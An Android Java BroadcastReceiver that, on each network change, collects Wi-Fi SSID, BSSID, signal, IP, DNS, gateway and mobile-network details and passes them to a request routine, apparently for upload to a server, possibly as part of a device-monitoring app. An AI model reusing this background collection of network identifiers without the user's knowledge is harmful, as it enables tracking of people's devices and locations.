package com.inet.android.bs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.List;

import org.apache.http.conn.util.InetAddressUtils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.net.ConnectivityManager;
import android.net.DhcpInfo;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.inet.android.certificate.R;
import com.inet.android.db.OperationWithRecordInDataBase;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public class NetworkChangeReceiver extends BroadcastReceiver {
	File outFile;
	File tmpFile;
	String str;
	BufferedReader fin;
	BufferedWriter fout;
	boolean network;
	String sendStr = "";
	Resources path;
	Context mContext;
	private static String lastEvent = "";
	public static final String LOG_TAG = NetworkChangeReceiver.class
			.getSimpleName().toString();

	@Override
	public void onReceive(final Context mContext, final Intent intent) {
		this.mContext = mContext;
		sendStr = "";

		if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) {
			Logging.doLog(LOG_TAG, "CONNECTIVITY_ACTION", "CONNECTIVITY_ACTION");
			path = mContext.getApplicationContext().getResources();
			// ConnectivityManager conMan = (ConnectivityManager) mContext
			// .getSystemService(Context.CONNECTIVITY_SERVICE);
			// NetworkInfo info = conMan.getActiveNetworkInfo();
			NetworkInfo info = intent
					.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);

			if (info != null) {
				Logging.doLog(LOG_TAG,
						info.getState().toString() + " " + info.getType(), info
								.getState().toString() + " " + info.getType());
				if (NetworkInfo.State.CONNECTED == info.getState()
						&& !lastEvent.equals(ConvertDate.logTime())) {
					lastEvent = ConvertDate.logTime();
					if (info.getType() == ConnectivityManager.TYPE_WIFI) {
						if (info.isConnected())
							getWifiState(info);
					} else if (info.getType() == ConnectivityManager.TYPE_MOBILE
							|| info.getType() == ConnectivityManager.TYPE_MOBILE_DUN
							|| info.getType() == ConnectivityManager.TYPE_MOBILE_HIPRI
							|| info.getType() == ConnectivityManager.TYPE_MOBILE_MMS
							|| info.getType() == ConnectivityManager.TYPE_MOBILE_SUPL) {
						sendStr += path.getString(R.string.connect_type) + ": "
								+ info.getTypeName() + "\n" + " "
								+ getMobileInfo(info.getSubtype()) + "\n"
								+ path.getString(R.string.state) + ": "
								+ info.getState() + "\n"
								+ path.getString(R.string.detailed_state)
								+ ": " + info.getDetailedState().name() + "\n"
								+ "Info: " + info.getExtraInfo() + "\n"
								+ "IP address: " + GetLocalIpAddress();
						sendCreateService(sendStr);
					} else {

						sendStr += path.getString(R.string.connect_type) + ": "
								+ info.getTypeName() + "\n"
								+ path.getString(R.string.subtype_name) + ": "
								+ info.getSubtypeName() + "\n"
								+ path.getString(R.string.state) + ": "
								+ info.getState() + "\n" + "Info: "
								+ info.getExtraInfo() + "\n";
						sendCreateService(sendStr);
					}
					OperationWithRecordInDataBase.sendRecord(mContext);

				} else if (NetworkInfo.State.DISCONNECTING == info.getState()) {
					Logging.doLog(LOG_TAG,
							"State.DISCONNECTING or retry event",
							"State.DISCONNECTING");
				}

			}
		}
		if (isOnline(mContext) != 0)
			ServiceControl.runTurnList(mContext);
	}

	public void setNetworkAvailable(boolean network) {
		this.network = network;
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		Editor ed = sp.edit();
		ed.putBoolean("nework_available", network);
		ed.commit();
		Logging.doLog(LOG_TAG, "network" + Boolean.toString(network), "network"
				+ Boolean.toString(network));
	}

	static public int isOnline(Context context) {
		final ConnectivityManager connMgr = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
	
		NetworkInfo netInfo = connMgr.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnected() && netInfo.isAvailable()){
			Logging.doLog(LOG_TAG, "isOnline connMgr", "isOnline connMgr");

			if (netInfo.getType() == ConnectivityManager.TYPE_WIFI)
				return 2;
			else
				return 1;
		}
		return 0;

	}

	private String GetLocalIpAddress() {
		try {
			Boolean useIPv4 = true;
			List<NetworkInterface> interfaces = Collections
					.list(NetworkInterface.getNetworkInterfaces());
			for (NetworkInterface intf : interfaces) {
				List<InetAddress> addrs = Collections.list(intf
						.getInetAddresses());
				for (InetAddress addr : addrs) {
					if (!addr.isLoopbackAddress()) {
						String sAddr = addr.getHostAddress().toUpperCase();
						boolean isIPv4 = InetAddressUtils.isIPv4Address(sAddr);
						if (useIPv4) {
							if (isIPv4)
								return sAddr;
						} else {
							if (!isIPv4) {
								int delim = sAddr.indexOf('%'); // drop ip6 port
																// suffix
								return delim < 0 ? sAddr : sAddr.substring(0,
										delim);
							}
						}
					}
				}
			}
		} catch (Exception ex) {
		} // for now eat exceptions
		return "";
	}

	private void getWifiState(NetworkInfo info) {

		WifiManager myWifiManager = (WifiManager) mContext
				.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
		WifiInfo myWifiInfo = myWifiManager.getConnectionInfo();

		Log.d(LOG_TAG, myWifiInfo.getMacAddress());

		if (info.isConnected()) {

			Log.d(LOG_TAG, "--- CONNECTED ---");

			WifiManager wifii = (WifiManager) mContext.getApplicationContext()
					.getSystemService(Context.WIFI_SERVICE);
			DhcpInfo dhcp = wifii.getDhcpInfo();

			String dns1 = "DNS 1: " + intToIpAddress(dhcp.dns1) + "\n";
			String dns2 = "DNS 2: " + intToIpAddress(dhcp.dns2) + "\n";
			String gateway = path.getString(R.string.gateway)
					+ intToIpAddress(dhcp.gateway) + "\n";

			String ipAddress = "IP Address: " + intToIpAddress(dhcp.ipAddress)
					+ "\n";
			String leaseDuration = "Lease Time: "
					+ String.valueOf(dhcp.leaseDuration) + "\n";
			String netmask = "Subnet Mask: " + intToIpAddress(dhcp.netmask)
					+ "\n";
			String serverAddress = "Server IP: "
					+ intToIpAddress(dhcp.serverAddress) + "\n";

			sendStr += path.getString(R.string.connect_type) + ": "
					+ info.getTypeName() + "\n"
					+ path.getString(R.string.state) + ": " + info.getState()
					+ "\n" + path.getString(R.string.name_wifi_network) + ": "
					+ myWifiInfo.getSSID() + "\n"
					+ path.getString(R.string.mac_address_point) + ": "
					+ myWifiInfo.getBSSID() + "\n"
					+ path.getString(R.string.speed) + ": "
					+ String.valueOf(myWifiInfo.getLinkSpeed()) + " "
					+ WifiInfo.LINK_SPEED_UNITS + "\n" + "RSRP: "
					+ String.valueOf(myWifiInfo.getRssi()) + " dBm" + "\n"
					+ ipAddress + " " + netmask + " " + serverAddress + " "
					+ dns1 + " " + dns2 + " " + gateway + " " + leaseDuration;
		
		} else {
			Log.d(LOG_TAG, "--- DIS-CONNECTED! ---");
			Log.d(LOG_TAG, "---");
			sendStr = path.getString(R.string.disconnected_wifi);
		}
		sendCreateService(sendStr);

	}

	private String intToIpAddress(int ipAddress) {
		return ((ipAddress & 0xFF) + "." + ((ipAddress >>>= 8) & 0xFF) + "."
				+ ((ipAddress >>>= 8) & 0xFF) + "." + ((ipAddress >>>= 8) & 0xFF));
	}

	private String getMobileInfo(int subType) {
		switch (subType) {
		case TelephonyManager.NETWORK_TYPE_1xRTT:
			return "NETWORK_TYPE_1xRTT ~ 50-100 kbps"; // ~ 50-100 kbps
		case TelephonyManager.NETWORK_TYPE_CDMA:
			return "NETWORK_TYPE_CDMA ~ 14-64 kbps"; // ~ 14-64 kbps
		case TelephonyManager.NETWORK_TYPE_EDGE:
			return "NETWORK_TYPE_EDGE ~ 50-100 kbps"; // ~ 50-100 kbps
		case TelephonyManager.NETWORK_TYPE_EVDO_0:
			return "NETWORK_TYPE_EVDO_0 ~ 400-1000 kbps"; // ~ 400-1000 kbps
		case TelephonyManager.NETWORK_TYPE_EVDO_A:
			return "NETWORK_TYPE_EVDO_A ~ 600-1400 kbps"; // ~ 600-1400 kbps
		case TelephonyManager.NETWORK_TYPE_GPRS:
			return "NETWORK_TYPE_GPRS ~ 100 kbps"; // ~ 100 kbps
		case TelephonyManager.NETWORK_TYPE_HSDPA:
			return "NETWORK_TYPE_HSDPA ~ 2-14 Mbps"; // ~ 2-14 Mbps
		case TelephonyManager.NETWORK_TYPE_HSPA:
			return "NETWORK_TYPE_HSPA ~ 700-1700 kbps"; // ~ 700-1700 kbps
		case TelephonyManager.NETWORK_TYPE_HSUPA:
			return "NETWORK_TYPE_HSUPA ~ 1-23 Mbps"; // ~ 1-23 Mbps
		case TelephonyManager.NETWORK_TYPE_UMTS:
			return "NETWORK_TYPE_UMTS ~ 400-7000 kbps"; // ~ 400-7000 kbps
			/*
			 * Above API level 7, make sure to set android:targetSdkVersion to
			 * appropriate level to use these
			 */
		case TelephonyManager.NETWORK_TYPE_EHRPD: // API level 11
			return "NETWORK_TYPE_EHRPD ~ 1-2 Mbps"; // ~ 1-2 Mbps
		case TelephonyManager.NETWORK_TYPE_EVDO_B: // API level 9
			return "NETWORK_TYPE_EVDO_B ~ 5 Mbps"; // ~ 5 Mbps
		case TelephonyManager.NETWORK_TYPE_HSPAP: // API level 13
			return "NETWORK_TYPE_HSPAP  ~ 10-20 Mbps"; // ~ 10-20 Mbps
		case TelephonyManager.NETWORK_TYPE_IDEN: // API level 8
			return "NETWORK_TYPE_IDEN ~25 kbps"; // ~25 kbps
		case TelephonyManager.NETWORK_TYPE_LTE: // API level 11
			return "NETWORK_TYPE_LTE ~ 10+ Mbps"; // ~ 10+ Mbps
			// Unknown
		case TelephonyManager.NETWORK_TYPE_UNKNOWN:
			return "NETWORK_TYPE_UNKNOWN";
		default:
			return "NETWORK_TYPE_UNKNOWN";
		}
	}

	private void sendCreateService(String sendStr) {
		RequestList.sendDataRequest(path.getString(R.string.network), sendStr,
				mContext);
	}
}